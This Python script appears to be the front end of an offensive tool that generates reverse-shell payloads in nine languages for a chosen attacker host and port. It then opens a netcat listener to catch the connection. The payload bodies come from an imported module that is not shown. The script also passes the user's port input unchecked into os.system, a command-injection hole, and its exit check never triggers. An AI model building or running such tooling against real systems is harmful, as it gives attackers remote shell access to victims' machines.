import payload
import art
from colorama import Fore as fore
import sys
import time
import os

art.tprint("5h3llR0m4nc3r",font="medium")

print("ReverseShell payload generator")
print("and Listening")

banner = """

+---------------------------+
|                           |
|(1)    bash                |
|(2)    python2             |
|(3)    python3             |
|(4)    perl                |
|(5)    php                 |
|(6)    netcat(traditional) |
|(7)    netcat              |
|(8)    ruby                |
|(9)    golang              |
+---------------------------+

    [+]select mode

"""

time.sleep(1)
print(banner)

prompt = "5h311@R0m4nc3r:~$ "

mode = input(prompt)

if mode == 0:
    print("Bye!!!!")
    sys.exit()


host = input("[+]SET LHOST => ")
port = input("[+]SET LPORT => ")


if mode == "1":
    cmd = payload.bash(host,port)

if mode == "2":
    cmd = payload.python2(host,port)

if mode == "3":
    cmd = payload.python3(host,port)

if mode == "4":
    cmd = payload.perl(host,port)

if mode == "5":
    cmd = payload.php(host,port)

if mode == "6":
    cmd = payload.netcat_traditional(host,port)

if mode == "7":
    cmd = payload.netcat(host,port)

if mode == "8":
    cmd = payload.ruby(host,port)

if mode == "9":
    cmd = payload.golang(host,port)

print("-"*20)
print(" "*2)
print(cmd)
print(" "*2)
print("-"*20)


os.system("nc -nlvp "+port)

